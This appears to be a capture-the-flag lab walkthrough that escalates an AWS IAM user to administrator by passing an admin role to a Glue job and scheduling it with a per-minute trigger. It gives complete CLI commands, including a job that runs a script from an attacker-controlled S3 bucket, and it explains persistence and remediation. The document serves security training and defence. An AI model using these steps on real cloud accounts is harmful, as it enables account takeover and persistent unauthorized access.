# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateJob + glue:CreateTrigger

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:CreateJob`, and `glue:CreateTrigger` permissions can create an AWS Glue job with an administrative role and establish a scheduled trigger that automatically executes the job. Unlike manual execution via `glue:StartJobRun`, this technique creates a persistent attack mechanism through scheduled automation.

AWS Glue jobs are ETL (Extract, Transform, Load) workloads that execute code in a managed Apache Spark or Python shell environment. When a Glue job is created, it can be assigned an IAM role that grants permissions to the job's execution environment. If an attacker can pass a privileged role to a Glue job and create a trigger with the `--start-on-creation` flag, they can establish automated privilege escalation that executes on a schedule (e.g., every minute).

The trigger-based approach is particularly dangerous because it demonstrates a persistence pattern rather than just immediate exploitation. The attacker creates a scheduled job that continuously grants administrative access, making it harder to detect and remediate. This technique shows how AWS service automation features can be abused for persistent privilege escalation.

## The Challenge

You start as `pl-prod-glue-004-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has three permissions that, in combination, create a privilege escalation path: `iam:PassRole`, `glue:CreateJob`, and `glue:CreateTrigger`.

Your goal is to gain administrator access. The target is `pl-prod-glue-004-to-admin-target-role`, an IAM role with `AdministratorAccess` attached. You cannot assume that role directly — but you can pass it to a Glue job you create, and then use a trigger to fire that job automatically.

## Reconnaissance

First, confirm your identity and verify you don't already have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-glue-004-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — you don't have admin access yet
```

With helpful permissions you can look up the target role to confirm it exists and has `AdministratorAccess`:

```bash
aws iam get-role --role-name pl-prod-glue-004-to-admin-target-role
aws iam list-attached-role-policies --role-name pl-prod-glue-004-to-admin-target-role
```

You'll see the role has `AdministratorAccess` attached and its trust policy allows `glue.amazonaws.com` to assume it — which means you can pass it to a Glue job.

## Exploitation

The attack has two steps: create a Glue job with the admin role attached, then create a trigger that fires the job automatically.

### Step 1: Create the Glue Job

You need a Python script hosted in S3 that the Glue job will execute. In this scenario Terraform has pre-uploaded that script to an attacker-controlled S3 bucket accessible by the prod account. The script calls `iam:AttachUserPolicy` to attach `AdministratorAccess` to `pl-prod-glue-004-to-admin-starting-user`.

With the script location in hand, create the Glue job and pass the admin role as its execution role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-004-to-admin-target-role"

aws glue create-job \
  --name "pl-glue-004-demo-job" \
  --role "$TARGET_ROLE_ARN" \
  --command "Name=pythonshell,ScriptLocation=s3://attacker-bucket/escalate.py,PythonVersion=3.9" \
  --default-arguments '{"--job-language":"python"}' \
  --max-capacity 0.0625 \
  --timeout 5
```

The key here is `--role "$TARGET_ROLE_ARN"`. This is the `iam:PassRole` action — you are delegating the admin role to the Glue service. When the job runs, every boto3 call it makes will execute under `pl-prod-glue-004-to-admin-target-role`'s permissions.

### Step 2: Create the Scheduled Trigger

Now create a SCHEDULED trigger with `--start-on-creation`. This is what makes the technique distinct from glue-003: you never need `glue:StartJobRun`. The trigger fires on its own schedule and Glue invokes the job on your behalf.

```bash
aws glue create-trigger \
  --name "pl-glue-004-demo-trigger" \
  --type SCHEDULED \
  --start-on-creation \
  --schedule "cron(0/1 * * * ? *)" \
  --actions '[{"JobName": "pl-glue-004-demo-job"}]'
```

The `cron(0/1 * * * ? *)` expression fires every minute. The `--start-on-creation` flag activates the trigger immediately when it is created, so it will fire at the next one-minute boundary without any further action from you.

Wait 1-3 minutes for the trigger to fire and the job to run to completion. With helpful permissions you can monitor progress:

```bash
aws glue get-trigger --name "pl-glue-004-demo-trigger" --query 'Trigger.State'
# ACTIVATED

aws glue get-job-runs --job-name "pl-glue-004-demo-job" --max-results 1 \
  --query 'JobRuns[0].JobRunState'
# RUNNING ... then SUCCEEDED
```

## Verification

Once the job shows `SUCCEEDED`, wait ~15 seconds for IAM policy propagation, then verify the escalation worked:

```bash
aws iam list-attached-user-policies --user-name pl-prod-glue-004-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Now succeeds — you have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/glue-004-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the combination of `iam:PassRole` + `glue:CreateJob` + `glue:CreateTrigger` to establish a persistent, automated privilege escalation path. By creating a scheduled Glue trigger with `--start-on-creation`, you bypassed the need for `glue:StartJobRun` entirely — the Glue service invoked the job on your behalf according to its schedule.

In a real environment this is particularly dangerous because the trigger continues firing every minute. Even if a defender detects and removes the `AdministratorAccess` attachment, the trigger will re-grant it at the next scheduled interval. Remediating this attack requires stopping the trigger, deleting the Glue job, and auditing for any other changes made during the window of elevated access.
